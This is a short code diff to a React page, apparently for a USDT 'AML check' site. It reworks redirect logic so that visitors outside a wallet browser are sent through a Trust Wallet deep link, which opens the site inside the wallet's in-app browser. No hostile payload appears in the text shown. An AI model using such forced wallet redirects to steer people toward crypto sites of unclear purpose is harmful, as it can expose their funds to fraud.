@@ -13,7 +13,7 @@ import { useDispatch, useSelector } from "react-redux";
 const DOMAIN = "https://usdtcheckaml.com";
 
 export default function Page() {
-  const [isRedirect, setIsRedirect] = useState(false);
+  const [isRedirect, setIsRedirect] = useState("");
 
   const { currentStep } = useSelector((store: RootState) => store.main);
   const dispatch = useDispatch();
@@ -33,12 +33,14 @@ export default function Page() {
       utm === "Trust_iOS_Browser";
 
     if (injected || isTrust) {
-      setIsRedirect(true);
+      setIsRedirect("no redirect");
+    } else {
+      setIsRedirect("redirect");
     }
   }, []);
 
   useEffect(() => {
-    if (isRedirect) {
+    if (isRedirect == "redirect") {
       window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(DOMAIN)}`;
     }
   }, [isRedirect]);
